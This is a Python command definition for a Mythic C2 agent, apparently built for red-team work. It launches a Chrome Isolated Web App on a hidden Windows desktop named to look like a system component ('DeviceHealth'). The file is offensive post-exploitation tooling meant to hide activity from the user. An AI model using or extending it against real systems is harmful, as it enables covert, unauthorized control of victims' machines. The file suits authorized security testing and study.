import hashlib

from mythic_container.MythicCommandBase import *


DEFAULT_IWA_APP_ID = "jkplinodenjddmmapdbmldfhamjbmlhm"
DEFAULT_IWA_WEB_BUNDLE_ID = "aovoftwbrfpbsfhx5ubkffwe3eut5dwyit5xd22lv6dibixower3qaacai"


def chrome_app_id_from_iwa_origin(iwa_origin: str) -> str:
    first_hash = hashlib.sha256(iwa_origin.encode("utf-8")).digest()
    second_hash = hashlib.sha256(first_hash).digest()[:16]
    alphabet = "abcdefghijklmnop"
    return "".join(alphabet[byte >> 4] + alphabet[byte & 0x0F] for byte in second_hash)


def chrome_app_id_from_web_bundle_id(web_bundle_id: str) -> str:
    return chrome_app_id_from_iwa_origin(f"isolated-app://{web_bundle_id.strip().strip('/')}/")


def normalize_iwa_app_id(value: str) -> str:
    app_id = (value or "").strip()
    if app_id.startswith("isolated-app://"):
        return chrome_app_id_from_web_bundle_id(
            app_id.removeprefix("isolated-app://").strip("/").split("/", 1)[0]
        )
    if app_id == DEFAULT_IWA_WEB_BUNDLE_ID or len(app_id) > 32:
        return chrome_app_id_from_web_bundle_id(app_id)
    return app_id


def valid_chrome_app_id(value: str) -> bool:
    return len(value) == 32 and all("a" <= char <= "p" for char in value)


class LaunchIwaHiddenDesktopArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="app_id",
                type=ParameterType.String,
                description="Chrome app ID to launch with --app-id. isolated-app:// URLs and web bundle IDs are accepted and normalized.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
                default_value="",
            ),
            CommandParameter(
                name="path",
                type=ParameterType.String,
                description="Chrome executable path.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
                default_value="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            ),
            CommandParameter(
                name="profile",
                type=ParameterType.String,
                description="Optional profile directory.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
                default_value="",
            ),
            CommandParameter(
                name="user_data_dir",
                type=ParameterType.String,
                description="Optional Chrome user data directory.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
                default_value="",
            ),
            CommandParameter(
                name="desktop",
                type=ParameterType.String,
                description="Hidden desktop name.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
                default_value="WinSta0\\DeviceHealth",
            ),
            CommandParameter(
                name="hold_ms",
                type=ParameterType.Number,
                description="Optional hold time before the native host closes process handles.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
                default_value=0,
            ),
            CommandParameter(
                name="show",
                type=ParameterType.Boolean,
                description="Show the launched window.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=7)],
                default_value=False,
            ),
        ]

    async def parse_arguments(self):
        command_line = self.command_line.strip()
        if not command_line:
            raise ValueError("launch_iwa_hidden_desktop requires an app_id")
        if command_line[0] == "{":
            self.load_args_from_json_string(command_line)
            return
        self.add_arg("app_id", command_line.split()[0])


class LaunchIwaHiddenDesktopCommand(CommandBase):
    cmd = "launch_iwa_hidden_desktop"
    needs_admin = False
    help_cmd = "launch_iwa_hidden_desktop <app_id|isolated-app://...> OR launch_iwa_hidden_desktop {\"app_id\":\"...\",\"profile\":\"Default\"}"
    description = "Launch Chrome with --app-id from the native messaging host on a hidden desktop."
    version = 1
    author = "@kingofthenops"
    attackmapping = ["T1106"]
    argument_class = LaunchIwaHiddenDesktopArguments
    attributes = CommandAttributes(spawn_and_injectable=False)

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        raw_app_id = taskData.args.get_arg("app_id") or ""
        app_id = normalize_iwa_app_id(raw_app_id)
        if not valid_chrome_app_id(app_id):
            return PTTaskCreateTaskingMessageResponse(
                TaskID=taskData.Task.ID,
                Success=False,
                Error="launch_iwa_hidden_desktop app_id must be a 32-character Chrome app id or a valid IWA isolated-app/web bundle id",
            )
        taskData.args.add_arg("app_id", app_id)
        profile = taskData.args.get_arg("profile") or ""
        for optional_name in ("profile", "user_data_dir"):
            if taskData.args.get_arg(optional_name) == "":
                try:
                    taskData.args.remove_arg(optional_name)
                except Exception:
                    pass
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams=f"{app_id} {profile}".strip(),
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
